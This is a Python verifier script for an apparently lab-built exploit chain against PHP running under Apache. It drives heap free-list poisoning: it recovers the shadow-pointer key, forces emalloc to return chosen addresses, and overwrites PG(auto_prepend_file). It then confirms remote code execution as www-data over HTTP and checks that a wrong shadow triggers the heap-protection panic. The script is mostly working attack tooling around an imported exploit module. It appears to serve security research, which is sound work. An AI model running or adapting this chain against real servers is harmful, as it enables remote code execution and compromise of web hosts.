#!/usr/bin/env python3
r"""Verifier for apache_freelist_libphp: checks the shadow model (round-trip + key
recovery, and decode==next on the live libphp heap), that correct-shadow poisons
make emalloc return a chosen address with the worker surviving, that an ordinary
write into the returned allocation lands at PG(auto_prepend_file) ~44+ MiB forward
of the chunk (past the single-write forward cap), that the full chain fires id as
www-data over a follow-up HTTP GET, and finally (worker-sacrificing) that a wrong
shadow trips the heap-protection panic.

Lab bring-up: docker compose -f docker-compose.apache-avenues.yml -p p2s-apfl
--profile apfl up -d --build (Apache 8.4.26, host port 8164). Pure stdlib,
python3 -I safe.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import subprocess
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


A = _load("apache_freelist_libphp", "apache_freelist_libphp.py")
F = A.F

# apache_freelist_libphp sets these on import (env-equivalent of
# `-p p2s-apfl --profile apfl`); reassert them so the compose exec/gdb plumbing
# targets the grouped lab's isolated project regardless of import order.
os.environ["COMPOSE_PROJECT_NAME"] = "p2s-apfl"
os.environ["COMPOSE_PROFILES"] = "apfl"


def _warm(port, tries=20):
    for _ in range(tries):
        try:
            subprocess.run(["curl", "-s", "-o", "/dev/null", "-m", "5",
                            f"http://127.0.0.1:{port}/"], timeout=8)
            return True
        except Exception:
            time.sleep(0.3)
    return False


def check_model():
    ok = True
    key = 0x89FFC71F459699DF
    for nxt in (0x0, 0x7f1796201140, 0x7f179919f6a0, 0xDEADBEEFCAFE):
        shadow = F.encode_shadow(nxt, key)
        if F.decode_shadow(shadow, key) != (nxt & F.MASK64):
            print(f"  MODEL FAIL: decode(encode({nxt:#x})) mismatch"); ok = False
        if F.recover_key(nxt, shadow) != key:
            print(f"  MODEL FAIL: recover_key({nxt:#x}) mismatch"); ok = False
    tgt = 0x7f179919f6a0
    nv, sv = F.poison_pair(tgt, key)
    if nv != tgt or F.decode_shadow(sv, key) != tgt:
        print("  MODEL FAIL: poison_pair inconsistent"); ok = False
    print(f"  model round-trip (encode/decode/recover/poison): {'OK' if ok else 'FAIL'}")
    return ok


def run(compose_file, service, port, trials, size, verbose):
    _warm(port)
    drv = A.ApacheFreeListPoison(compose_file, service, size=size, verbose=verbose)
    pids = drv.workers()
    if not pids:
        print("no apache workers (lab down?)"); return 2
    pid = pids[0]
    lay = drv.layout(pid)
    chunk, base = lay["chunk"], lay["binbase"]
    pg_addr = (base + A.AUTO_PREPEND_OFF) if base else None

    print("=" * 78)
    print("verify free-list poison -> libphp -- Apache 8.4.26  (worker pid %d)" % pid)
    print("=" * 78)
    print("[MODEL] pure-Python shadow model vs zend_alloc.c:")
    model_ok = check_model()
    print(f"  chunk={chunk:#x}  libphp_base={base:#x}  "
          f"PG(auto_prepend_file)={pg_addr:#x}")

    # (1) WIN reliability ---------------------------------------------------
    print(f"\n[1/WIN] {trials} independent correct-shadow poisons (reliability):")
    wins = alive = 0
    far_dist = None
    for i in range(trials):
        rk = drv.read_shadow_key(pid)
        if rk is None:
            print(f"  trial {i}: could not read a bin slot"); continue
        key, head, _, _ = rk
        target = chunk + (0x100000 + i * 0x20000)   # >=1 MiB forward, varied
        far_dist = target - head
        r = drv.poison_alloc(pid, head, target, key,
                             writeback=bytes([0x50, 0x32, i & 0xFF]) + b"AFL")
        wins += 1 if r["returned_chosen"] else 0
        alive += 1 if r["alive"] else 0
        print(f"  trial {i}: T={target:#x} chosen={r['returned_chosen']} "
              f"alive={r['alive']} wrote_back={r['readback'] is not None}")
    print(f"  => returned-chosen {wins}/{trials}, worker-survived {alive}/{trials}")

    # (3)+(4) REACH: PG(auto_prepend_file) write-back ------------------------
    print("\n[3+4/REACH] PG(auto_prepend_file) aim, write-back verified:")
    print(f"  var_hash_rw forward cap          : {F.FORWARD_CAP} B (~16 KiB)")
    if far_dist is not None:
        print(f"  WIN far-chunk distance  : {F._human(far_dist)}  "
              f"({'FAR past' if far_dist > F.FORWARD_CAP else 'within'} the var_hash_rw cap)")
    reach_pg = None
    if pg_addr:
        rk = drv.read_shadow_key(pid)
        if rk:
            key, head, _, _ = rk
            r = drv.poison_write_bytes(pid, head, pg_addr, key, b"P2SPGWW8")
            exp = int.from_bytes(b"P2SPGWW8", "little")
            dist = abs(pg_addr - chunk)
            reach_pg = r["returned_chosen"] and r["alive"] and (r["readback"] == exp)
            print(f"  PG target T={pg_addr:#x}  ({F._human(dist)} FWD of chunk, "
                  f"var_hash_rw-IMPOSSIBLE)")
            print(f"    emalloc returned chosen : {r['returned_chosen']}  alive={r['alive']}")
            print(f"    write-back matched       : {r['readback'] == exp} "
                  f"(got {r['readback'] and hex(r['readback'])})")
            # restore PG to NULL (we just wrote filler into it)
            rk = drv.read_shadow_key(pid)
            if rk:
                key, head, _, _ = rk
                drv.poison_write_bytes(pid, head, pg_addr, key, (0).to_bytes(8, "little"))

    # (5) RCE end-to-end ----------------------------------------------------
    print("\n[5/RCE] poison -> PG(auto_prepend_file) -> follow-up HTTP auto-prepend:")
    rce_ok = A.do_rce(compose_file, service, port, size=size, verbose=False)

    # (2) GATE negative LAST (sacrifices the single worker) ------------------
    print(f"\n[2/GATE] WRONG-shadow poison (expect panic; worker dies+respawns):")
    pid = drv.workers()[0]
    rk = drv.read_shadow_key(pid)
    gate_ok = False
    if rk:
        key, head, _, _ = rk
        target = chunk + 0x140000
        r = drv.poison_alloc(pid, head, target, key, corrupt_shadow=True)
        gate_ok = (not r["alive"])
        print(f"  wrong-shadow: alive={r['alive']} panicked={r['panicked']} "
              f"returned_chosen={r['returned_chosen']}  -> gate {'HELD' if gate_ok else '??'}")
        # respawn + re-warm so the lab is left healthy
        _warm(port)
        newpids = drv.workers()
        print(f"  respawned worker(s): {newpids}  (was {pid})")
    else:
        print("  could not read worker slot for the gate")

    print("\n" + "=" * 78)
    verdict = (model_ok and wins == trials and alive == trials
               and (reach_pg in (None, True)) and rce_ok and gate_ok)
    print("VERDICT: %s" % ("ALL PROOFS HELD" if verdict else "see failures above"))
    print("  model=%s  win=%d/%d  survive=%d/%d  pg_reach=%s  rce=%s  gate=%s"
          % (model_ok, wins, trials, alive, trials, reach_pg, rce_ok, gate_ok))
    print("=" * 78)
    return 0 if verdict else 1


def main(argv=None):
    ap = argparse.ArgumentParser(description="A/B + reliability verifier for the apache free-list poison")
    ap.add_argument("--compose-file", default=A.DEFAULT_COMPOSE)
    ap.add_argument("--service", default=A.DEFAULT_SERVICE)
    ap.add_argument("--port", type=int, default=8164)
    ap.add_argument("--trials", type=int, default=5)
    ap.add_argument("--size", type=int, default=A.DEFAULT_ALLOC_SIZE)
    ap.add_argument("--verbose", action="store_true")
    a = ap.parse_args(argv)
    return run(a.compose_file, a.service, a.port, a.trials, a.size, a.verbose)


if __name__ == "__main__":
    raise SystemExit(main())
